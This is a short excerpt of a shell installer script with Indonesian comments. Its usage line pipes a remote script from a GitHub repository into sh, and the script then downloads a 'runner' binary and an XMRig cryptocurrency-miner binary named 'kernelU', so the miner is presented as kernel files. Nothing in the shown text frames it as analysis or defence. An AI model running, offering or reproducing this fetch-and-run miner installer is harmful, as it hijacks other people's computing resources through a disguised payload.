...
#
# Cara pakai:
#   curl -fsSL https://raw.githubusercontent.com/anonking-67/anon76/main/kernel/oneline-kernel.sh | sh
...
[ -f "$BIN" ] || {
    ...
    curl -fsSL -o "$BIN" "${RAW_URL}/kernel/${BIN}" || { echo "[-] Gagal download runner $BIN"; exit 1; }
}

# Download XMRig binary (kernelU)
[ -f "kernelU" ] || {
    echo "[+] Download XMRig binary (kernelU)..."
    curl -fsSL -o "kernelU" "${RAW_URL}/kernel/kernelU" || { echo "[-] Gagal download kernelU"; exit 1; }
}
